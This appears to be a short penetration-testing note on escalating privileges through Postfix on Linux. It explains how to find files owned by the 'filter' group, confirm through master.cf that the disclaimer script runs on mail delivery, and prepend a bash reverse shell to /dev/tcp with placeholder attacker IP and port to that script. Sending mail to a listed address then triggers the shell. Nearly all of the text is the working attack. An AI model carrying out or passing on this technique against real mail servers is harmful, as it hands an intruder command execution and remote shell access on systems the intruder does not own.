Postfix

Postfix is a free and open-source mail transfer agent (MTA) that handles the sending and receiving of email messages on a Linux system

Privilege escalation

    First check if you are in a group named "filter" or similar

    Check which files are owned by the group:

    find / -group filter 2>/dev/null

    In case you found those files you are lucky

    /etc/postfix/disclaimer 
/var/spool/filter

    Then check which of those files are being used looking at the master.cnf

    cat /etc/postfix/master.cf | grep disclaimer

    The result should be:

    dfilt      unix  -       n       n       -       -       pipe flags=Rq user=filter argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}

    In the previous output we can see that the disclaimer script is executed since it's configured in the file. So we could attempt to modify the file and inject our code

    At the beggining of the file, we can add our reverse shell payload. It is recommended to use a simple reverse shell since we don't know if the postfix user has root privielges:

    bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1
    In order to complete te exploit we need to send a mail with the any of the users present in the the following file /etc/postfix/disclaimer_addresses
